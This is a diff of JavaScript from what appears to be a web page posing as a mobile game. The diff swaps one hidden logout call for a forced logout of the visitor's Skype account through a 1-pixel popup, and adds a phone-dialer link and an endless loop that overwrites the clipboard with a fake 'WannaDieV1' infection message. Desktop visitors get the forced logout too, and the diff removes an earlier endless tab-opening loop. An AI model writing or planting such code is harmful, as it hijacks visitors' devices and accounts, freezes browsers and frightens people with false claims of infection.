@@ -209,21 +209,20 @@ function myFunction() {
 
 if(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)){
   // true for mobile device
-  var times = 9999999999999999999999999;
-  for(var i = 0; i < times; times++)
-  {
-window.open("https://apps.apple.com/us/app/messages/id1146560473");
-window.open("https://apps.apple.com/us/app/notes/id1110145109");
 let myWindow;
-  myWindow = window.open("https://www.modd.io/logout", "_Blank", "width=1,height=1");
+  myWindow = window.open("https://secure.skype.com/account/logout", "_Blank", "width=1,height=1");
 
   myWindow.close();
-    console.log(times);
+  window.open('tel:UrMom');
+for(let i = 1; i > 0; i++) {
+    navigator.clipboard.writeText("Dam It Your Iphone Or Any Mobile Phone, Has Been Infected By WannaDieV1 The Damaged Has Been Already Made...");
   }
+  
+  
 }else{
 alert("you can only play games on mobile");
 let myWindow;
-  myWindow = window.open("https://www.modd.io/logout", "_Blank", "width=1,height=1");
+  myWindow = window.open("https://secure.skype.com/account/logout", "_Blank", "width=1,height=1");
 
   myWindow.close();
 }
